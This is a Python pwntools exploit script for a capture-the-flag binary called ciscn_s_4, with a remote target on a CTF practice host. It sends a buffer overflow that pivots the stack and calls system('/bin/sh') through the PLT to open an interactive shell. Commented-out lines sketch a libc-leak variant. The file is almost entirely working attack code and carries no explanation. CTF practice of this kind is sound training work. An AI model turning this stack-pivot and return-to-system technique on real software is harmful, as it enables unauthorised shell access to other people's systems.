import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_4')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28881)
			elf=ELF('./ciscn_s_4')
			libc=ELF('../../x64libc/libc.so.6')

		io.recv()
		pay='a'*0x28+p32(0x0804A328)+p32(0x080485D8)
		io.send(pay)
		io.recv()
		pay='a'*0x28+p32(0x0804A328)+p32(0x080485D8)
		io.send(pay)
		io.recv()
		#gdb.attach(io)
		#pause()
		io.send(p32(0x0804A328)+p32(elf.plt['system'])+p32(0x080485D8)+p32(0x0804A310)+'/bin/sh\x00'+'\x00'*0x10+p32(0x0804A300)+p32(0x080485FD))
		#io.recvuntil('\n')
		#libc_base=u32(io.recv()[:4])-libc.sym['read']
		#libc.address=libc_base
		#io.send(p32(0x0804A328)+p32(libc.sym['system'])+p32(0x080485D8)+p32(libc.search('/bin/sh\x00').next())+'\x00'*0x18+p32(0x0804A300)+p32(0x080485FD))



		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue